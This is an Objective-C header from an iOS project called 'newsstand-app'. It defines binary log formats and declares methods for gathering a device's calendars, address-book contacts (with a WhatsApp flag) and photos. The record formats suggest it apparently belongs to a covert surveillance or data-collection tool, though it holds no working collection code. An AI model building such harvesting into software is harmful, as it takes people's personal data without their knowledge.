//
//  ViewController.h
//  newsstand-app
//
//  Created by Massimo Chiodini on 10/29/14.
//
//

#import <UIKit/UIKit.h>
#import <MapKit/MapKit.h>
#import <Photos/Photos.h>
#import <AddressBook/AddressBook.h>
#import "AppDelegate.h"

#define	POOM_V1_0_PROTO   0x01000000
#define FLAG_REMINDER			0x00000001
#define FLAG_COMPLETE			0x00000002
#define FLAG_TEAMTASK			0x00000004
#define FLAG_RECUR				0x00000008
#define FLAG_RECUR_NoEndDate	0x00000010
#define FLAG_MEETING			0x00000020
#define FLAG_ALLDAY				0x00000040
#define FLAG_ISTASK				0x00000080

enum ObjectTaskTypes{
  POOM_TYPE_MASK          = 0x00FFFFFF,
  
  POOM_STRING_SUBJECT     =	0x01000000,
  POOM_STRING_CATEGORIES	=	0x02000000,
  POOM_STRING_BODY        =	0x04000000,
  POOM_STRING_RECIPIENTS	=	0x08000000,
  POOM_STRING_LOCATION    =	0x10000000,
  
  POOM_OBJECT_RECUR       =	0x80000000
};

typedef struct _TaskRecur {
  UInt32 lRecurrenceType;
  UInt32 lInterval;
  UInt32 lMonthOfYear;
  UInt32 lDayOfMonth;
  UInt32 lDayOfWeekMask;
  UInt32 lInstance;
  UInt32 lOccurrences;
  int64_t	ftPatternStartDate;
  int64_t	ftPatternEndDate;
} RecurStruct, *pRecurStruct;

typedef struct _Header {
  UInt32		dwSize;
  UInt32		dwVersion;
  UInt32		lOid;
} HeaderStruct, *pHeaderStruct;

typedef struct _PoomCalendar {
  UInt32		_dwFlags;
  UInt32   _ftStartDateLo;
  UInt32   _ftStartDateHi;
  UInt32   _ftEndDateLo;
  UInt32   _ftEndDateHi;
  UInt32	_lSensitivity;
  UInt32	_lBusyStatus;
  UInt32	_lDuration;
  UInt32	_lMeetingStatus;
} PoomCalendar;


#define	CONTACT_LOG_VERSION_NEW	0x01000001
typedef struct _organizerAdditionalHeader{
  u_int32_t size;
  u_int32_t version;
  u_int32_t identifier;
  u_int32_t program;
  u_int32_t flags;
} organizerAdditionalHeader;
/**/

typedef struct _Names {
#define CONTACTNAME   0xC025
  int     magic;
  int     len;
  //wchar_t buffer[1];
} Names;

typedef struct _ABNumbers {
#define CONTACTNUM    0xC024
  int     magic;
  int     type;
  //Names   number;
} ABNumbers;

typedef struct _ABContats {
#define CONTACTCNT    0xC023
  int         magic;
  int         numContats;
  //ABNumbers contact[1];
} ABContats;

typedef struct _ABFile {
#define CONTACTFILE   0xC022
  int       magic;
  int       flag; //= 0x80000000 if ourself || 0x00000001 = whatsapp
  int       len;
  //Names      first;
  //Names      last;
  //ABContacts contact[1];
} ABFile;

typedef struct _ABLogStrcut {
#define   CONTACTLIST   0xC021
#define   CONTACTLIST_2 0x1000C021
  int     magic;
  int     len;
  int     numRecords;
  //ABFile  file[1];
} ABLogStrcut;

typedef struct _PhotoLogStruct {
#define LOG_PHOTO_VERSION 2015012601
    u_int32_t    uVersion;
    char         strJsonLog[0];
} PhotoLogStruct, *pPhotoLogStruct;



@interface ViewController : UIViewController <CLLocationManagerDelegate>

{
    AppDelegate *appDelegate;
}

- (void)getCalendars;
- (void)getABContatcs;
- (void)getPhotos;

@end

